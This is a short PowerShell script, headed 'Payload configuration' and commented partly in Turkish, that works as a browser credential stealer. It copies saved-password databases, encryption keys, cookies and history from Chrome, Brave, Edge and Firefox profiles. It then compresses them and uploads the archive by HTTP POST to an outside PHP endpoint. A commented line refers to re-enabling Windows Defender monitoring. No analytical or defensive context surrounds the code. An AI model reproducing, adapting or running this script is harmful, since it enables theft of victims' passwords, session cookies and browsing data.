#-- Payload configuration --#

# Set destination directory directly to AppData
$destDir = "$env:APPDATA\BrowserData"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copied: $file"
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - No profile found."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Re-enable Windows Defender real-time monitoring (if needed)
#Set-MpPreference -DisableRealtimeMonitoring $false
# Sıkıştırmak istediğiniz klasörün yolu
$folderPath = "%APPDATA%\BrowserData"

# ZIP dosyasının hedef yolu
$zipFilePath = "%APPDATA%\ZippedBrowserData\BrowserData.zip"

# Klasörü ZIP dosyasına sıkıştırma
Compress-Archive -Path $folderPath\* -DestinationPath $zipFilePath


# Yüklemek istediğiniz dosyanın yolu
$filePath = "%APPDATA%\ZippedBrowserData\BrowserData.zip"

# PHP dosya yükleme URL'si
$url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın

# Dosya yüklemek için form data oluşturma
$form = @{
    fileToUpload = Get-Item $filePath
}

# POST isteği gönderme
$response = Invoke-RestMethod -Uri $url -Method Post -Form $form

# Yanıtı yazdırma
Write-Output $response




exit
